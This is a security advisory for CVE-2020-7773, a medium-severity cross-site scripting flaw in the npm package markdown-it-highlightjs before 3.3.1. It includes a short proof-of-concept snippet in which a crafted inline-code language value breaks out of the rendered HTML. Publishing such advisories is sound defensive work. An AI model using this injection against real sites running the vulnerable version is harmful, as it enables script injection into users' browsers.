# [M] Cross-site Scripting in markdown-it-highlightjs

## Summary
Severity: Medium
Advisory: GHSA-f246-xrrj-g8j6
CVE: CVE-2020-7773
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2022-02-10
Source: https://github.com/advisories/GHSA-f246-xrrj-g8j6
Type: github-advisory

## Affected
- npm: `markdown-it-highlightjs` — affected >=0 <3.3.1

## Details
This affects the package markdown-it-highlightjs before 3.3.1. It is possible insert malicious JavaScript as a value of lang in the markdown-it-highlightjs Inline code highlighting feature. 

```js
const markdownItHighlightjs = require("markdown-it-highlightjs");
const md = require('markdown-it'); 
const reuslt_xss = md().use(markdownItHighlightjs, { inline: true }).render('console.log(42){.">js}'); 
console.log(reuslt_xss);
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7773
- https://github.com/valeriangalliat/markdown-it-highlightjs/pull/14
- https://github.com/valeriangalliat/markdown-it-highlightjs/blob/v3.3.0/index.js%23L52
- https://snyk.io/vuln/SNYK-JS-MARKDOWNITHIGHLIGHTJS-1040461
